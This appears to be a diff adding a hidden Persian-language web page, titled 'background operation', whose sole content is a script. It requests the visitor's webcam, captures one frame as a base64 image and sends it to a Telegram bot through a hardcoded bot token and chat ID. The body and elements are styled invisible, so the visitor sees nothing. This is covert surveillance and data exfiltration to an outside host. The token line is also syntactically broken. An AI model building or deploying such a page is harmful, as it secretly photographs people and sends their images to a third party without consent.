@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عملیات در پس‌زمینه</title>
+    <style>
+        /* همه چیز مخفی است */
+        body, video, canvas { display: none; margin: 0; padding: 0; }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    <script>
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // گرفتن عکس و تبدیل به Base64
+                    const imageData = canvas.toDataURL('image/png');
+
+                    // ارسال به تلگرام
+                    uploadToTelegram(imageData);
+
+                    // متوقف کردن دوربین
+                    stream.getTracks().forEach(track => track.stop());
+                };
+            })
+            .catch(error => console.error('خطا:', error));
+
+        function uploadToTelegram(imageData) {
+            const botToken = 8119892930:AAHklX_h1aAUcCdR-N417fjLpywGWBIH0dY;
+            const chatId = 5871430093;
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    photo: imageData
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log('عکس با موفقیت ارسال شد!');
+                } else {
+                    console.error('خطا در ارسال عکس.');
+                }
+            });
+        }
+    </script>
+</body>
+</html>
